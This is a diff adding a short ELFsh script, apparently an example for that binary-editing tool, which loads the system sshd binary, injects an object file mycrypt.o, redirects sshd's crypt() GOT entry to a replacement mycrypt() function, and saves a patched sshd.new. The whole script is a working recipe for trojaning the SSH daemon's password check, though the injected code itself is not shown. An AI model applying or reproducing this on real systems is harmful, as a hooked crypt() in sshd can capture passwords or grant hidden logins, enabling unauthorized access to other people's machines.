@@ -1,0 +1,14 @@
+#!/usr/bin/elfsh
+
+load /usr/sbin/sshd
+load mycrypt.o
+
+# Inject mycrypt.o into sshd
+reladd 1 2
+
+# Modify crypt() got entry and make it point on mycrypt() which resides
+# into mycrypt.o
+set 1.got[crypt] mycrypt
+
+save sshd.new
+quit
